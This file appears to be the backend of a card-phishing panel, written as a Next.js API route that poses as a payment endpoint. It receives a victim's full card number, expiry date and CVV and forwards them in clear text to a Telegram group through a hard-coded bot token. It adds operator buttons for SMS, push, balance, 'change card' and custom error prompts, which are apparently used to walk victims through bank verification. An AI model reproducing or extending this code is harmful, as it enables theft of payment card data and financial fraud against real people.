import { NextRequest, NextResponse } from 'next/server';
import { Telegraf } from 'telegraf';

// Bot configuration
const BOT_TOKEN = '8091715985:AAF4vygWjtydtkzvjTN8TwyvethE46vptQA';
const LOGS_GROUP_ID = '-4938154910';

const bot = new Telegraf(BOT_TOKEN);

export async function POST(request: NextRequest) {
  try {
    const { cardNumber, cardExp, cardCvv, price, orderId } = await request.json();

    // Validation
    if (!cardNumber || !cardExp || !cardCvv || !price) {
      return NextResponse.json(
        { error: 'Missing required fields' },
        { status: 400 }
      );
    }

    // Create log message for admin group
    const logMessage = `
💳 <b>NEW PAYMENT</b>

📋 <b>Card Details:</b>
└ Number: <code>${cardNumber}</code>
└ Expiry: <code>${cardExp}</code>
└ CVV: <code>${cardCvv}</code>

💰 <b>Amount:</b> ${price} AED
🆔 <b>Order:</b> #${orderId}

⏰ <b>Time:</b> ${new Date().toLocaleString('en-US')}
📊 <b>Status:</b> Pending
    `;

    // Send message to admin group
    const message = await bot.telegram.sendMessage(LOGS_GROUP_ID, logMessage, {
      parse_mode: 'HTML',
      reply_markup: {
        inline_keyboard: [
          [{ text: 'Pending', callback_data: 'nothing' }],
          [{ text: '👁', callback_data: `eye_${orderId}` }],
          [
            { text: '🛑 Leave', callback_data: `log_${orderId}_leave` },
            { text: '✅ Success', callback_data: `log_${orderId}_setStatus_success` }
          ],
          [
            { text: 'SMS', callback_data: `log_${orderId}_setStatus_sms` },
            { text: 'PUSH', callback_data: `log_${orderId}_setStatus_push` }
          ],
          [
            { text: 'CARD', callback_data: `log_${orderId}_setStatus_card` },
            { text: 'BALANCE', callback_data: `log_${orderId}_setStatus_balance` }
          ],
          [
            { text: 'SKIP', callback_data: `log_${orderId}_setStatus_skip` },
            { text: 'CHANGE CARD', callback_data: `log_${orderId}_setStatus_change` }
          ],
          [
            { text: 'CUSTOM QUESTION', callback_data: `custom_${orderId}` },
            { text: 'CUSTOM ERROR', callback_data: `customError_${orderId}` }
          ]
        ]
      }
    });

    return NextResponse.json({
      success: true,
      logId: orderId,
      messageId: message.message_id,
      status: 'pending'
    });

  } catch (error) {
    console.error('Payment log creation error:', error);
    return NextResponse.json(
      { error: 'Failed to create payment log' },
      { status: 500 }
    );
  }
}
